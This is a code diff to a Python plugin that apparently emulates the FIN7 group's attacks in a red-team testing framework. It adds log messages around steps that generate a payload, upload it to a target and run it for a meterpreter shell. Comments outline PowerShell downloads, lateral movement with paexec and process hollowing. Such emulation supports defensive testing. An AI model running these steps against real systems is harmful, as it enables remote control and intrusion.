@@ -93,6 +93,9 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
 
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Create babymetal replacement{CommandlineColors.ENDC}",
+            1)
         # Uploaded stager creates meterpreter shell (babymetal)
         # Generate payload:
 
@@ -106,11 +109,19 @@ class FIN7Plugin(AttackPlugin):
                                outfile=payload_name)
         self.attacker_machine_plugin.get(payload_name, self.targets[0].get_machine_path_external())
         src = os.path.join(self.targets[0].get_machine_path_external(), payload_name)
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Deploy babymetal replacement{CommandlineColors.ENDC}",
+            1)
         self.targets[0].put(src, self.targets[0].get_playground())
         if self.targets[0].get_playground() is not None:
             pl = os.path.join(self.targets[0].get_playground(), payload_name)
         else:
             pl = payload_name
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute babymetal replacement - waiting for meterpreter shell{CommandlineColors.ENDC}",
+            1)
         self.targets[0].remote_run(pl, disown=True)
 
         # adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/
@@ -144,7 +155,7 @@ class FIN7Plugin(AttackPlugin):
 
         # powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
         # spawn powershell through cmd
-        # use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
+        # !!! admin host!!! use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
         # paexec  starts temorary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
         # hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
         # svchost starts data exchange
